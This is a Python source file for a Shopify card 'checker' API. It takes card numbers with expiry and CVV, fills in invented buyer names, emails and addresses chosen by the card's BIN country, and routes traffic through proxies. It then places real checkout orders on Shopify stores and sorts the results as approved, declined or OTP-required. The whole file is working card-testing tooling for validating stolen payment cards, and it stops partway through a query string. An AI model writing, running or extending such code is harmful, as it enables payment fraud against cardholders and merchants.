#!/usr/bin/env python3
"""
Jinx API — ShopifyK-Based Shopify Checker (v6.1 FIXED)
========================================================
Based on ShopifyK.py workflow
Fixes:
  - UNKNOWN_ERROR → tigyi error codes
  - $$0.25 → $0.25 (price cleanup)
  - Session token OK → continue to proposal (exception handling)
"""

import os
import sys
import re
import json
import time
import random
import asyncio
import logging
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from concurrent.futures import ThreadPoolExecutor

try:
    import aiohttp
except ImportError:
    print("❌ pip install aiohttp")
    sys.exit(1)

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks  # noqa
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


BRAND = "Jinx"
VERSION = "6.1.0"
HOST = os.environ.get("API_HOST", "0.0.0.0")
PORT = int(os.environ.get("PORT", "8080"))
WORKERS = int(os.environ.get("API_WORKERS", "20"))

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("jinx")


# ═══ BIN → COUNTRY ═══
BOOK = {
    "US": {"address1": "123 Main St", "city": "NY", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586",
           "currency": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198",
           "currency": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW16XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123",
           "currency": "GBP"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210",
           "currency": "INR"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567",
           "currency": "AED"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555",
           "currency": "HKD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430",
           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345",
           "currency": "CHF"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567",
           "currency": "AUD"},
    "MX": {"address1": "Av. Reforma 222", "city": "CDMX", "postalCode": "06600",
           "zoneCode": "CMX", "countryCode": "MX", "phone": "5555555555",
           "currency": "MXN"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586",
                "currency": "USD"},
}

_bin_cache = {}
_bin_lock = __import__("threading").Lock()


def lookup_bin_country(bin6):
    bin6 = str(bin6)[:6]
    if not bin6.isdigit():
        return "US"
    with _bin_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]
    if HAS_REQUESTS:
        try:
            r = requests.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5)
            if r.status_code == 200:
                d = r.json()
                c = (d.get("country_code") or d.get("country_alpha2") or "US").upper()
                with _bin_lock:
                    _bin_cache[bin6] = c
                return c
        except Exception:
            pass
    with _bin_lock:
        _bin_cache[bin6] = "US"
    return "US"


def addr_for(cc_number):
    cc = lookup_bin_country(cc_number[:6])
    return BOOK.get(cc, BOOK["DEFAULT"])


# ═══ PROXY PARSER ═══
def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if not p:
        return None
    if p.startswith(("socks5://", "socks5h://", "socks4://", "http://", "https://")):
        return p
    if "@" in p:
        return f"http://{p}"
    parts = p.split(":")
    if len(parts) == 4:
        ip, port, user, pw = parts
        return f"http://{user}:{pw}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    return None


# ═══ UTILS ═══
def get_random_name():
    first = ["James", "John", "Robert", "Michael", "William", "David",
             "Mary", "Patricia", "Jennifer", "Linda"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia",
            "Miller", "Davis", "Rodriguez"]
    return random.choice(first), random.choice(last)


def generate_email(first, last):
    dom = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{first.lower()}.{last.lower()}@{random.choice(dom)}"


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                return parts[1].split(end, 1)[0] or None
    except Exception:
        pass
    return None


def clean_price(raw):
    """Remove $ signs and make sure single $ prefix"""
    if raw is None:
        return "-"
    s = str(raw).strip()
    if not s or s in ("-", "0.00", "$0.00", "0", "$0"):
        return "-"
    # Remove all $ signs
    s = s.replace("$", "").strip()
    try:
        val = float(s)
        if val <= 0:
            return "-"
        return f"${val:.2f}"
    except Exception:
        return "-"


def is_captcha_required(text):
    if not text:
        return False
    ind = ['CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"',
           'captcha required', 'hcaptcha', 'h-captcha']
    t = text.upper()
    return any(i.upper() in t for i in ind)


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)',
        r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    words = message.split()
    if words:
        first_word = words[0]
        if "_" in first_word and first_word.isupper():
            return first_word
    return message[:50]


# ═══ ShopifyK.py PROCESS_CARD (Async) ═══
async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"
                result = (await resp.json())['products']
                if not result:
                    return False, "No Products!"
        min_price = float('inf')
        min_product = None
        for product in result:
            if not product.get('variants'):
                continue
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        price = float(price.replace(',', ''))
                    else:
                        price = float(price)
                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                        }
                except (ValueError, TypeError, AttributeError):
                    continue
        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return min_product
        return False, "No Valid Products"
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


async def make_graphql_request(session, graphql_url, params, headers, json_data):
    try:
        response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
        response_text = await response.text()
        return response, response_text
    except Exception as e:
        return None, str(e)


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, debug_log=None):
    """Full ShopifyK.py logic - always returns a message string"""
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    def dbg(msg):
        if debug_log is not None:
            debug_log.append(msg)
        log.warning(f"[{cc[:6]}] {msg}")

    try:
        ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
        proxy = parse_proxy(proxy_str) if proxy_str else None

        address_info = addr_for(cc)
        country_code = address_info["countryCode"]
        currency = address_info.get("currency", "USD")

        firstName, lastName = get_random_name()
        email = generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]

        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple) and info[0] is False:
                return False, info[1], gateway, total_price, currency
            variant_id = info['variant_id']
            total_price = info['price']
            dbg(f"Picked variant {variant_id} at ${total_price}")

        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'

            # ── 1. Cart ──
            cart_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'application/json',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1',
                                           headers=cart_headers, proxy=proxy)
            if cart_resp.status != 200:
                cart_headers_alt = {**cart_headers, 'Content-Type': 'application/json'}
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            if cart_resp.status != 200:
                dbg(f"Cart failed {cart_resp.status}")
                return False, "CART_FAILED", gateway, total_price, currency
            dbg("Cart added")

            # ── 2. Checkout init ──
            checkout_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            response = await session.post(url=checkout, allow_redirects=True,
                                          headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)
            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or \
                  response.headers.get('x-checkout-one-session-token')
            text = await response.text()

            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, '"serializedSessionToken":"', '"')
                if not sst:
                    sst = extract_between(text, '"sessionToken":"', '"')

            if 'login' in checkout_url.lower():
                dbg("Site requires login")
                return False, "SITE_LOGIN_REQUIRED", gateway, total_price, currency

            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or \
                         extract_between(text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or \
                       extract_between(text, '"stableId":"', '"')
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or 'USD'

            subtotal = extract_between(
                text,
                'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                '&quot;'
            ) or extract_between(
                text,
                '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"',
                '"'
            )
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else total_price

            if not sst:
                dbg("No session token")
                return False, "NO_SESSION_TOKEN", gateway, total_price, currency
            dbg("Session token OK")

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': ourl,
                'Referer': ourl,
                'x-checkout-one-session-token': sst,
            }

            # ── 3. Proposal ──
            params = {'operationName': 'Proposal'}
            json_data = {
                'query': PROPOSAL_QUERY,
                'variables': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {'deliveryLines': [{
                        'destination': {'partialStreetAddress': {
                            'address1': street, 'address2': '', 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True}}, 'options': {}},
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True}],
                        'noDeliveryRequired': [], 'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId or '1',
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None,
                            'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {'totalAmount': {'any': True}, 'paymentLines': [],
                        'billingAddress': {'streetAddress': {
                            'address1': '', 'city': '', 'countryCode': country_code,
                            'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'countryCode': country_code},
                        'rememberMe': False},
                    'tip': {'tipLines': []},
                    'taxes': {'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {'signature': None, 'signatureUuid': None,
                        'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                        'shippingScriptChanges': []},
                    'optionalDuties': {'buyerRefusesDuties': False},
                },
                'operationName': 'Proposal',
            }

            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'

            response, resp_text = await make_graphql_request(
                session, graphql_url, params, headers, json_data
            )
            if not response:
                dbg(f"Proposal request failed: {resp_text}")
                return False, f"PROPOSAL_REQUEST_FAILED", gateway, total_price, currency
            if is_captcha_required(resp_text):
                dbg("CAPTCHA_REQUIRED")
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                dbg(f"Invalid JSON: {str(e)[:60]}")
                return False, f"INVALID_JSON_PROPOSAL", gateway, total_price, currency

            if 'errors' in resp_json:
                error_msgs = [e.get('message', str(e)) for e in resp_json['errors'][:3]]
                clean = extract_clean_response("; ".join(error_msgs))
                dbg(f"GraphQL Error: {clean}")
                return False, clean, gateway, total_price, currency

            try:
                session_data = resp_json['data'].get('session')
                negotiate = session_data.get('negotiate')
                result = negotiate.get('result')
                result_type = result.get('__typename', 'Unknown')

                if result_type == 'CheckpointDenied':
                    return False, "CHECKPOINT_DENIED", gateway, total_price, currency
                if result_type == 'Throttled':
                    return False, "THROTTLED", gateway, total_price, currency
                if result_type == 'NegotiationResultFailed':
                    return False, "NEGOTIATION_FAILED", gateway, total_price, currency

                checkpoint_data = result.get('checkpointData')
                seller_proposal = result.get('sellerProposal')
                delivery_data = seller_proposal.get('delivery')
                running_total = seller_proposal['runningTotal']['value']['amount']
            except (KeyError, TypeError) as e:
                dbg(f"Proposal parse error: {str(e)[:60]}")
                return False, f"PROPOSAL_PARSE_ERROR", gateway, total_price, currency

            if not delivery_data:
                return False, "NO_DELIVERY_DATA", gateway, total_price, currency

            delivery_type = delivery_data.get('__typename', '')
            delivery_strategy = ''
            shipping_amount = 0.0

            if delivery_type == 'FilledDeliveryTerms':
                delivery_lines = delivery_data.get('deliveryLines', [{}])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        delivery_strategy = strategies[0].get('handle', '')
                        try:
                            shipping_amount = float(strategies[0].get('amount', {}).get('value', {}).get('amount', '0'))
                        except Exception:
                            shipping_amount = 0.0

            try:
                tax_data = seller_proposal.get('tax', {})
                if tax_data and tax_data.get('__typename') == 'FilledTaxTerms':
                    tax_amount = float(tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                else:
                    tax_amount = 0.0
            except Exception:
                tax_amount = 0.0

            payment_data = seller_proposal.get('payment', {})
            payment_identifier = None
            gateway = "UNKNOWN"

            if payment_data and payment_data.get('__typename') == 'FilledPaymentTerms':
                for method in payment_data.get('availablePaymentLines', []):
                    pm = method.get('paymentMethod', {})
                    if pm.get('name') or pm.get('paymentMethodIdentifier'):
                        payment_identifier = pm.get('paymentMethodIdentifier')
                        gateway = pm.get('extensibilityDisplayName') or pm.get('name', 'UNKNOWN')
                        try:
                            total_price = str(float(running_total) + shipping_amount + tax_amount)
                        except Exception:
                            total_price = str(running_total)
                        break

            if not payment_identifier:
                dbg("No payment method")
                return False, "NO_PAYMENT_METHOD", gateway, total_price, currency
            dbg(f"Payment method: {gateway}")

            # ── 4. Vault ──
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None,
                    "start_year": None, "issue_number": "",
                    "name": f"{firstName} {lastName}",
                },
                "payment_session_scope": urlparse(url).netloc,
            }
            vault_headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0',
            }

            token = None
            try:
                async with aiohttp.ClientSession() as vault_session:
                    vresp = await vault_session.post(
                        'https://checkout.pci.shopifyinc.com/sessions',
                        json=vault_payload, headers=vault_headers
                    )
                    if vresp.status == 200:
                        try:
                            token_data = await vresp.json()
                            token = token_data.get('id')
                        except Exception:
                            pass
            except Exception as e:
                dbg(f"Vault exception: {str(e)[:40]}")

            if not token:
                dbg("Vault failed")
                return False, "VAULT_FAILED", gateway, total_price, currency
            dbg("Payment token OK")

            # ── 5. Submit ──
            params = {'operationName': 'SubmitForCompletion'}
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {'deliveryLines': [{
                        'destination': {'streetAddress': {
                            'address1': street, 'address2': '', 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}},
                        'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {
                            'handle': delivery_strategy if delivery_strategy else '',
                            'customDeliveryRate': False}, 'options': {'phone': phone}},
                        'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'value': {
                            'amount': str(shipping_amount), 'currencyCode': currency}},
                        'destinationChanged': False}],
                        'noDeliveryRequired': [], 'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True},
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId or '1',
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None,
                            'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {'totalAmount': {'any': True},
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {
                            'paymentMethodIdentifier': payment_identifier,
                            'sessionId': token,
                            'billingAddress': {'streetAddress': {
                                'address1': street, 'address2': '', 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone}},
                            'cardSource': None}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None}],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': '', 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False},
                    'taxes': {'proposedAllocations': None,
                        'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}},
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url},
            }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data

            submit_json_data = {
                'query': SUBMIT_QUERY,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion',
            }

            response, text = await make_graphql_request(
                session, graphql_url, params, headers, submit_json_data
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            if "Your order total has changed" in text:
                return False, "SITE_NOT_SUPPORTED", gateway, total_price, currency
            if "The requested payment method is not available" in text:
                return False, "PAYMENT_METHOD_UNAVAILABLE", gateway, total_price, currency

            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                if not submit_data:
                    for error in resp_json.get('errors', []):
                        code = error.get('code')
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "EMPTY_SUBMIT", gateway, total_price, currency

                result_type = submit_data.get('__typename', '')

                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get('id')
                elif result_type == 'SubmitFailed':
                    return False, extract_clean_response(submit_data.get('reason', 'SUBMIT_FAILED')), gateway, total_price, currency
                elif result_type == 'SubmitRejected':
                    for error in submit_data.get('errors', []):
                        code = error.get('code', '')
                        localized = error.get('localizedMessage', '')
                        non_localized = error.get('nonLocalizedMessage', '')
                        if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                            detail = localized or non_localized
                            if detail:
                                return False, detail, gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "SUBMIT_REJECTED", gateway, total_price, currency
                elif result_type == 'Throttled':
                    return False, "THROTTLED", gateway, total_price, currency

                receipt = submit_data.get('receipt', {})
                rid = receipt.get('id')
                if not rid:
                    return False, "NO_RECEIPT_ID", gateway, total_price, currency
            except json.JSONDecodeError:
                return False, f"INVALID_JSON_SUBMIT", gateway, total_price, currency
            except Exception as e:
                return False, f"SUBMIT_PARSE_ERROR", gateway, total_price, currency

            # ── 6. Poll ──
            params = {'operationName': 'PollForReceipt'}
            poll_json_data = {
                'query': POLL_QUERY,
                'variables': {'receiptId': rid, 'sessionToken': sst},
                'operationName': 'PollForReceipt',
            }
            await asyncio.sleep(3)
            for i in range(4):
                response, final_text = await make_graphql_request(
                    session, graphql_url, params, headers, poll_json_data
                )
                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency
                try:
                    poll_json = json.loads(final_text)
                    receipt_data = poll_json.get('data', {}).get('receipt', {})
                    if receipt_data:
                        typename = receipt_data.get('__typename', '')
                        if typename == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == 'FailedReceipt':
                            error = receipt_data.get('processingError', {})
                            error_type = error.get('__typename', '')
                            if error_type == 'PaymentFailed':
                                code = error.get('code', '')
                                msg = error.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else 'PAYMENT_FAILED', gateway, total_price, currency
                            code = error.get('code') or error_type or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif typename == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        if typename in ['ProcessingReceipt', 'WaitingReceipt']:
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass
                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "CHANGE_PROXY_OR_SITE", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif result:
                    return True, result, gateway, total_price, currency
                else:
                    return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code = extract_between(final_text, '{"code":"', '"')
            final_lower = final_text.lower()
            if 'actionreq' in final_lower or 'action_required' in final_lower:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in final_lower:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in final_lower or 'declined' in final_lower:
                return True, code if code else "CARD_DECLINED", gateway, total_price, currency
            else:
                return False, "POLL_TIMEOUT", gateway, total_price, currency

    except asyncio.TimeoutError:
        dbg("TIMEOUT")
        return False, "REQUEST_TIMEOUT", gateway, total_price, currency
    except aiohttp.ClientError as e:
        dbg(f"ClientError: {str(e)[:60]}")
        return False, "PROXY_FAIL", gateway, total_price, currency
    except Exception as e:
        dbg(f"EXCEPTION: {type(e).__name__}: {str(e)[:80]}")
        return False, f"EXCEPTION_{type(e).__name__}", gateway, total_price, currency


# ═══ QUERIES ═══
PROPOSAL_QUERY = (
    "query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
    "$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,"
    "$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,"
    "$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,"
    "$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,"
    "$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,"
    "$optionalDuties:OptionalDutiesInput,$captcha:CaptchaInput){"
    "session(sessionInput:$sessionInput){negotiate(input:{"
    "purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,"
    "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,"
    "note:$note,nonNegotiableTerms:$nonNegotiableTerms,"
    "localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,"
    "optionalDuties:$optionalDuties,captcha:$captcha},checkpointData:$checkpointData,"
    "queueToken:$queueToken}){__typename result{"
    "...on NegotiationResultAvailable{checkpointData queueToken "
    "sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}"
    "subtotalBeforeTaxesAndShipping{value{amount currencyCode __typename}__typename}"
    "delivery{...on FilledDeliveryTerms{deliveryLines{id "
    "availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}"
    "payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{"
    "name paymentMethodIdentifier __typename}__typename}__typename}__typename}"
    "tax{...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}__typename}"
    "__typename}__typename}...on CheckpointDenied{redirectUrl __typename}"
    "...on Throttled{pollAfter queueToken pollUrl __typename}"
    "...on NegotiationResultFailed{__typename}__typename}"
    "errors{code localizedMessage __typename}__typename}}}"
)

SUBMIT_QUERY = (
    "mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,"
    "$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,"
    "$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken "
    "metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult "
    "analytics:$analytics){"
    "...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}"
    "...on SubmitFailed{reason __typename}"
    "...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}"
    "...on Throttled{pollAfter pollUrl queueToken __typename}"
    "...on CheckpointDenied{redirectUrl __typename}"
    "...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}"
    "fragment ReceiptDetails on Receipt{"
    "...on ProcessedReceipt{id token orderIdentity{buyerIdentifier id __typename}__typename}"
    "...on ProcessingReceipt{id pollDelay __typename}"
